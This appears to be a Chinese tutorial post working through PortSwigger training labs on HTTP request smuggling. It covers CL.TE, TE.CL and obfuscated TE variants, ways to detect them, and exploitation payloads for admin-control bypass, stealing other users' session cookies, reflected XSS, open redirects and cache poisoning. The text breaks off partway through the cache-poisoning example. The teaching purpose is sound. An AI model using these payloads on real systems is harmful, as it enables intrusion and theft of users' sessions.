> 原文链接: https://www.anquanke.com//post/id/246516 


# 梨子带你刷burpsuite靶场之高级漏洞篇 - HTTP请求走私专题


                                阅读量   
                                **37201**
                            
                        |
                        
                                                                                    



[<img class="alignnone size-full wp-image-252730 aligncenter" alt="" width="720" height="359" data-original="https://p5.ssl.qhimg.com/t01ef440fe05b624b87.png">](https://p5.ssl.qhimg.com/t01ef440fe05b624b87.png)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 高级漏洞篇介绍

> 相对于服务器端漏洞篇和客户端漏洞篇，高级漏洞篇需要更深入的知识以及更复杂的利用手段，该篇也是梨子的全程学习记录，力求把漏洞原理及利用等讲的通俗易懂。



## 高级漏洞篇 – HTTP请求走私专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%9F"></a>什么是HTTP请求走私？

所谓HTTP请求走私攻击，顾名思义，就会像走私一样在一个HTTP请求包中夹带另一个或多个HTTP请求包，在前端看来是一个HTTP请求包，但是到了后端可能会被解析器分解开从而导致夹带的HTTP请求包也会被解析，最终可以导致未授权访问敏感数据或攻击其他用户。

### <a class="reference-link" name="%E9%82%A3%E4%B9%88%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F"></a>那么一次HTTP请求走私攻击会发生什么呢？

现如今，在前端与处理应用程序逻辑的后端之间往往会有其他中转服务器，用户在前端提交请求，由中转服务器进行中转，但是就像传话一样，总会有差错意的情况，中转请求也会如此，比如之前讲的把多个HTTP请求捆成一个提交，但是中转服务器可能会将这些请求拆解开，一个一个转发给目标服务器，此时就可能因为解析了多余的HTTP请求而导致各种意外，不仅是多个HTTP压缩成一个HTTP请求的情况，有时候将两个模棱两可的HTTP请求发出，但是有可能因为中转服务器差错意而错误拼接它们也会导致意外

### <a class="reference-link" name="%E9%82%A3%E4%B9%88HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%98%AF%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E7%9A%84%E5%91%A2%EF%BC%9F"></a>那么HTTP请求走私是如何产生的呢？

大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法指定请求的结束位置
- Content-Length头
- Transfer-Encoding头
Content-Length头以字节为单位指定消息正文的长度，例如

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

Transfer-Encoding头一般指定邮件正文使用分块编码，例如

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

每个块之间以换行符分割开，直到块大小为0字节时视为正文的结束，就是因为这两种不同的方法来指定HTTP消息的长度，就导致如果同时使用这两个头会造成冲突，HTTP规范中规定，如果两个头同时存在则忽略Content-Length头，此时如果出现一下两种情况：
- 一些服务器不支持Transfer-Encoding头
- 如果对头做了混淆处理则有些服务器虽然支持Transfer-Encoding头也不会处理它


## 怎么发动一次HTTP请求走私攻击呢？

HTTP请求走私攻击大致分为三种，CL.TE、TE.CL、TE.TE

### <a class="reference-link" name="CL.TE%E6%BC%8F%E6%B4%9E"></a>CL.TE漏洞

首先请求包中需要同时包含CL头(Content-Length)和TE头(Transfer-Encoding)，我们参考如下示例

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

```

从上面这一个HTTP请求包来看，CL头设置的是13，即从正文开始算包含13个字节的内容为止算是一个请求包，但是当这个请求包发到后端服务器时会采用TE头来处理请求包，此时会因为0的下一行是空行而认为该请求包已经结束了，那么多出来的内容怎么办呢？会被认为是下一个请求包的开始，此时则会产生HTTP请求走私攻击

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9AHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E5%9F%BA%E7%A1%80CL.TE%E6%BC%8F%E6%B4%9E"></a>配套靶场：HTTP请求走私攻击中的基础CL.TE漏洞

因为是CL.TE攻击，所以我们直接构造如下paylaod

[<img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t0160dd43886a447167.png">](https://p2.ssl.qhimg.com/t0160dd43886a447167.png)

CL头的值为6，就是包含三行共六个字节(包括换行符)，TE头指定了使用分块编码，发送两次请求包，成功因为前后端处理方式不同而导致HTTP走私攻击

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0189a152bcd267f14e.png">](https://p1.ssl.qhimg.com/t0189a152bcd267f14e.png)

### <a class="reference-link" name="TE.CL%E6%BC%8F%E6%B4%9E"></a>TE.CL漏洞

这一种就是前端服务器使用TE头处理，而后端服务器使用CL头处理，我们参考如下示例

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

原理就是前端服务器通过使用TE头指定的分块编码来分割处理请求包，既然是分块编码，就得指定每个分块的大小，就如上述代码所示，第一个分块大小为8字节长，第二个分块大小为0，分块编码会一直读取直到分块大小为0，所以以上的请求包会被前端当成一个请求包转发到后端服务器，但是到了后端服务器会因为CL头指定的长度仅包括了8及后面的CLRF字符而将这个请求包分割成两个处理，这就导致了HTTP请求走私漏洞

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9AHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E5%9F%BA%E7%A1%80TE.CL%E6%BC%8F%E6%B4%9E"></a>配套靶场：HTTP请求走私攻击中的基础TE.CL漏洞

因为我们已经知道了漏洞类型，我们可以直接构造payload

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t019aa8958fa175ef73.png">](https://p3.ssl.qhimg.com/t019aa8958fa175ef73.png)

这里有一个需要注意的，就是在0的后面要添加两个空行，然后就也会因为前后端对HTTP请求方式不同而导致HTTP走私攻击

[<img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t01aabb6d37780eb432.png">](https://p0.ssl.qhimg.com/t01aabb6d37780eb432.png)

### <a class="reference-link" name="TE.TE%E6%BC%8F%E6%B4%9E%EF%BC%9A%E6%B7%B7%E6%B7%86TE%E5%A4%B4"></a>TE.TE漏洞：混淆TE头

现在的场景是虽然前后端都支持TE头，但是可以通过某种混淆手段让某一端不处理TE头，例如

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

```

下面我们通过一道靶场来深入理解这种攻击手段

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9AHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E6%B7%B7%E6%B7%86TE%E5%A4%B4"></a>配套靶场：HTTP请求走私攻击中的混淆TE头

我们只要对两个TE头做混淆，所以我们构造如下paylaod

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t01b94580003f722067.png">](https://p1.ssl.qhimg.com/t01b94580003f722067.png)

我们看到有两个TE头，但是有一个TE头是做了混淆的，所以就会导致在后端的时候不使用TE头来处理此时会转而采用CL头处理，从而将一个HTTP请求拆分成两个，导致HTTP走私攻击

[<img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t0127c3e1bfd2f5876a.png">](https://p0.ssl.qhimg.com/t0127c3e1bfd2f5876a.png)



## 寻找HTTP请求走私攻击

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E5%8F%91%E7%8E%B0HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"></a>利用计时技术发现HTTP请求走私漏洞

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E5%8F%91%E7%8E%B0CL.TE%E6%BC%8F%E6%B4%9E"></a>利用计时技术发现CL.TE漏洞**

当同时存在CL头和TE头时，如果请求包正文的长度大于CL头指定的长度，则会导致请求包只有CL头指定长度内的内容，从而导致后端服务器因为采用TE头处理而一直等待后续请求包，最终会导致超时，故可以证明存在CL.TE漏洞，例如

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

```

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E5%8F%91%E7%8E%B0TE.CL%E6%BC%8F%E6%B4%9E"></a>利用计时技术发现TE.CL漏洞**

这种漏洞也是，如果正文是被空行分隔的两部分则也会导致仅发出不完整的请求导致后端服务器在利用CL头接收请求包时等待，直到超时，则可以证明存在TE.CL漏洞，例如

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

```

值得注意的是如果应用程序可能受到CL.TE攻击，那么针对TE.CL漏洞的利用计时技术的测试可能会干扰其他应用程序用户。因此，要保持隐蔽并最大程度地减少超时现象，应该首先使用CL.TE测试，只有在第一次测试不成功时才继续进行TE.CL测试。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%93%8D%E5%BA%94%E5%B7%AE%E5%BC%82%E7%A1%AE%E8%AE%A4HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"></a>利用响应差异确认HTTP请求走私漏洞

发送两次请求，第一个是魔改的请求包，第二个是正常的请求，这样就能用第一个请求干扰后端服务器对第二个请求包的处理

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%93%8D%E5%BA%94%E5%B7%AE%E5%BC%82%E7%A1%AE%E8%AE%A4CL.TE%E6%BC%8F%E6%B4%9E"></a>利用响应差异确认CL.TE漏洞**

因为是CL.TE，所以在第一个请求包结束以后加入一个空行再开始编写第二个请求包，像这样

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&amp;x=
0

GET /404 HTTP/1.1
Foo: x

```

第一次发送这个请求包会因为后端服务器利用TE头处理而将第二个请求包作为单独的请求包处理，但是第二个请求包又不完整，所以会等待后续的请求包，当第二次发送请求后会将上一次的剩余的请求头与这一次请求包合并起来处理，此时会接收到异常的响应，就能判断存在CL.TE漏洞，像这样

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E5%93%8D%E5%BA%94%E5%B7%AE%E5%BC%82%E7%A1%AE%E8%AE%A4HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%AD%E7%9A%84CL.TE%E6%BC%8F%E6%B4%9E"></a>配套靶场：利用响应差异确认HTTP请求走私中的CL.TE漏洞**

因为是CL.TE，所以可以这样构造payload

[<img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t018d7f18e6eb619b9b.png">](https://p0.ssl.qhimg.com/t018d7f18e6eb619b9b.png)

发送两次以后，就会触发HTTP请求走私漏洞

[<img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t017ff16b30fe9ed6e2.png">](https://p4.ssl.qhimg.com/t017ff16b30fe9ed6e2.png)

**<a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%93%8D%E5%BA%94%E5%B7%AE%E5%BC%82%E7%A1%AE%E8%AE%A4TE.CL%E6%BC%8F%E6%B4%9E"></a>利用响应差异确认TE.CL漏洞**

因为是TE.CL漏洞，所以CL头设置为第一个请求包之内的长度，TE头设置为分块编码，像这样

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

值得注意的是0后面有一个\r\n\r\n，然后在Repeater中关闭了自动填充，这样就能走私出第二个请求包，然后第二个请求包中也会有一个CL头，这个CL头要足够大到能包含下一个接收到的请求包，此时会导致虽然第二次发出的是正常的请求包，也会因为与之前走私的请求包合并而接收到走私请求包应收到的响应，就判断存在TE.CL漏洞，像这样

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E5%93%8D%E5%BA%94%E5%B7%AE%E5%BC%82%E7%A1%AE%E8%AE%A4HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%AD%E7%9A%84TE.CL%E6%BC%8F%E6%B4%9E"></a>配套靶场：利用响应差异确认HTTP请求走私中的TE.CL漏洞**

因为是TE.CL漏洞，所以可以构造如下paylaod

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t0104f61923f29c7f7b.png">](https://p3.ssl.qhimg.com/t0104f61923f29c7f7b.png)

发送两次请求即可触发HTTP请求走私攻击

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0157766b095a5879a3.png">](https://p1.ssl.qhimg.com/t0157766b095a5879a3.png)

### <a class="reference-link" name="%E5%9C%A8%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87%E5%B9%B2%E6%89%B0%E5%85%B6%E4%BB%96%E8%AF%B7%E6%B1%82%E7%A1%AE%E8%AE%A4%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%97%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E7%9A%84%E8%80%83%E8%99%91%E5%9B%A0%E7%B4%A0"></a>在尝试通过干扰其他请求确认请求走私漏洞时的一些重要的考虑因素
- 应使用不同的网络连接发送攻击请求和正常请求
- 攻击请求和正常请求应尽可能使用相同的URL和参数名称，这样大概率会将它们转发到相同的后端服务器
- 在发送了攻击请求之后应尽可能立即发送正常请求，因为可能有其他请求与之竞争
- 如果应用系统部署了负载均衡，可能要多发几次，因为可能会被转发到不同的后端服务器
- 如果虽然成功干扰了后续的请求但是收到的响应并不是预期的，可能有真实用户遭受到了攻击


## 利用HTTP请求走私漏洞

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"></a>利用HTTP请求走私绕过前端安全控制

一些应用系统的前端配置了某些安全控制，以决定是否允许将请求转发到后端服务器，所以如果请求通过了前端的安全控制，则会被后端服务器无条件接受，而不会进行其他的检查，这样的话就可以利用HTTP走私请求将恶意的请求包夹带在正常的请求包中送到后端服务器，例如

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com

```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%88%A9%E7%94%A8CL.TE%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"></a>配套靶场1：利用CL.TE绕过前端安全控制的HTTP请求走私攻击

因为前端服务器会拒绝转发/admin的请求，但是可以利用CL.TE请求走私来让/admin的请求进入后端服务器，所以我们构造如下paylaod

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01dbbc862022d5a574.png">](https://p3.ssl.qhimg.com/t01dbbc862022d5a574.png)

从截图来看/admin请求已经可以传到后端服务器了，但是页面提示只有本地用户才能访问，于是我们再修改一下payload

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t0104ddf3a0256a8300.png">](https://p3.ssl.qhimg.com/t0104ddf3a0256a8300.png)

但是我们发现因为两个请求包的Host头不同而被拒绝了，所以我们需要再修改一下payload

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01df963c3c036674e7.png">](https://p3.ssl.qhimg.com/t01df963c3c036674e7.png)

我们发现只要将第二个请求包修改成一个正常的请求包即可会被后端服务器当成一个新的请求包来解析，我们看到了删除用户的URL，于是我们修改一下URL重新发送请求，即可成功删除指定用户

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01ef6805498be0a24b.png">](https://p3.ssl.qhimg.com/t01ef6805498be0a24b.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%88%A9%E7%94%A8TE.CL%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"></a>配套靶场2：利用TE.CL绕过前端安全控制的HTTP请求走私攻击

我们采用相同的方式构造payload，但是我们需要把自动更新CL头的值关掉，因为我们要利用后端服务器通过CL头分割请求包来让第二个请求包走私出来，于是我们这样构造payload

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01a2ae6d21e1bf40ab.png">](https://p5.ssl.qhimg.com/t01a2ae6d21e1bf40ab.png)

然后为了被后端服务器识别为本地用户我们还需要再修改一下请求包

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01c478f73e5fb2684b.png">](https://p5.ssl.qhimg.com/t01c478f73e5fb2684b.png)

我们看到我们已经被识别为本地用户并且进入admin页面了，于是我们就能修改URL删除指定用户了

[<img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t0150eca21b94728e5c.png">](https://p2.ssl.qhimg.com/t0150eca21b94728e5c.png)

### <a class="reference-link" name="%E5%9B%9E%E6%98%BE%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%AF%B7%E6%B1%82%E9%87%8D%E5%86%99%E7%9A%84%E8%BF%87%E7%A8%8B"></a>回显前端对请求重写的过程

有一些应用系统会在将请求转发到后端服务器之前对请求做一些重写，如
- 终止TLS连接并加入一些头部描述使用的协议和加密算法
- 添加一个包含用户IP地址的X-Forwarded-For头部
- 基于用户会话令牌决定用户ID并添加一个识别用户的头
- 添加一些其他攻击感兴趣的敏感信息
有时候如果走私请求缺少由前端服务器添加的头的话可能会导致走私请求攻击失败，所以我们需要利用某些手段回显前端服务器重写的方式，如
- 寻找一个可以把请求的参数值反馈到响应中的POST请求
- 移动参数以使它们会反馈在消息正文中的最后面
- 构造发往后端服务器的走私请求，紧接着一个普通的请求以使得到回显
我们关注这样的一个请求包

```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net

```

响应会包含下面这条<br>`&lt;input id="email" value="wiener[@normal](https://github.com/normal)-user.net" type="text"&gt;`<br>
我们可以通过HTTP请求走私攻击获得重写的结果，像这样

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...

```

请求将由前端服务器重写以包含额外的头，然后后端服务器将处理走私的请求并将重写的第二个请求视为电子邮件参数的值，像这样

```
&lt;input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...

```

由于最后的请求正在被重写，我们不知道什么时候结束。CL头中的值将决定后端服务器相信该请求的时间。如果值设置得太短，就只会收到部分重写的请求；如果设置太长，后端服务器将超时等待请求完成。解决的方法就是猜测一个比提交的请求大一点的初始值，然后逐渐增大该值直到得到所有的信息。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9B%9E%E6%98%BE%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%AF%B7%E6%B1%82%E9%87%8D%E5%86%99%E7%9A%84%E8%BF%87%E7%A8%8B"></a>配套靶场：利用HTTP请求走私回显前端对请求重写的过程

我们看到一个搜索框，那么这可能存在HTTP请求走私漏洞点，所以我们这样构造payload

[<img class="aligncenter" alt="" data-original="https://p4.ssl.qhimg.com/t01c1ff8e67c854ec3a.png">](https://p4.ssl.qhimg.com/t01c1ff8e67c854ec3a.png)

我们发现由前端重写的请求包会被反馈在响应中，说明我们成功通过HTTP请求走私漏洞获取到了前端服务器用来指定来源IP的字段名，我们就可以伪造成本地用户了，于是我们这样修改请求包

[<img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t013c68cef1e7cffd33.png">](https://p2.ssl.qhimg.com/t013c68cef1e7cffd33.png)

我们已经看到了删除指定用户的URL，所以我们再次修改请求包，成功删除指定用户

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t0156f8d81ea3939caa.png">](https://p3.ssl.qhimg.com/t0156f8d81ea3939caa.png)

### <a class="reference-link" name="%E7%AA%83%E5%8F%96%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"></a>窃取其他用户的请求

有些应用程序包含任何允许存储和检索文本数据的功能，则可以利用HTTP请求走私来窃取其他用户的请求，原理与上一种利用方式相似，也是将其他用户的请求包作为参数值包含在响应中，burp官方以评论功能为例，即将请求包包含在用来存储评论内容的参数comment中，例如这样的提交评论的请求

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;comment=My+comment&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net

```

我们可以通过HTTP请求走私攻击将数据存储请求走私到后端，像这样

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=

```

当后端服务器处理另一个用户的请求时，它会附加到走私的请求中，结果用户的请求被存储，包括受害用户的会话cookie和任何其他敏感数据，像这样

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AA%83%E5%8F%96%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"></a>配套靶场：利用HTTP请求走私窃取其他用户的请求

因为有评论功能，所以我们构造如下payload，多试几次，就能成功窃取到其他用户的请求

[<img class="aligncenter" alt="" data-original="https://p2.ssl.qhimg.com/t013b467f3f03a91245.png">](https://p2.ssl.qhimg.com/t013b467f3f03a91245.png)

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t0170d652db42e38907.png">](https://p5.ssl.qhimg.com/t0170d652db42e38907.png)

我们成功获得了目标用户的cookie，然后用他的cookie登录

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t0106c29145cb504dec.png">](https://p1.ssl.qhimg.com/t0106c29145cb504dec.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>利用HTTP请求走私触发反射型XSS

利用HTTP请求走私触发反射型XSS有两个相对于普通反射型XSS的优点
- 它不需要与受害者用户进行交互
- 它可用于在请求的某些部分中利用XSS，如在HTTP请求头中
示例如下，通过UA注入XSS payload

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;
Foo: X

```

下一个用户的请求将附加到走私的请求中，就会在响应中收到反射型XSS payload。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：利用HTTP请求走私触发反射型XSS

因为题目已经告知我们要在UA头里面构造payload，所以我们构造如下请求包

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01f728ae372776d764.png">](https://p3.ssl.qhimg.com/t01f728ae372776d764.png)

然后发送两次请求以后即可触发HTTP请求走私攻击了，用户就会受到XSS攻击

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t015940e03eae250fb1.png">](https://p1.ssl.qhimg.com/t015940e03eae250fb1.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%B0%86%E9%A1%B5%E9%9D%A2%E5%86%85%E9%87%8D%E5%AE%9A%E5%90%91%E8%BD%AC%E5%8F%98%E4%B8%BA%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91"></a>利用HTTP请求走私将页面内重定向转变为开放重定向

首先我们看这样一个请求

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/

```

这是一个页面内重定向的请求，但是我们可以利用HTTP请求走私使其跳转到其他任意域，例如

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X

```

后续的请求会被影响成这样

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/

```

此处，用户请求的是由网站上的页面导入的JS文件。攻击者可以通过在响应中返回他们自己的JS来完全危害受害用户。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8F%91%E5%8A%A8web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>利用HTTP请求走私发动web缓存投毒

由上一种情况派生出，如果应用系统开启了缓存功能，在已经生成了重定向到恶意域的缓存以后，会影响到其他的用户，例如

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com

```

走私的请求到达后端服务器，后端服务器像以前一样通过开放重定向进行响应。服务器会缓存/static/include.js的响应。

```
GET /static/include.js HTTP/1.1
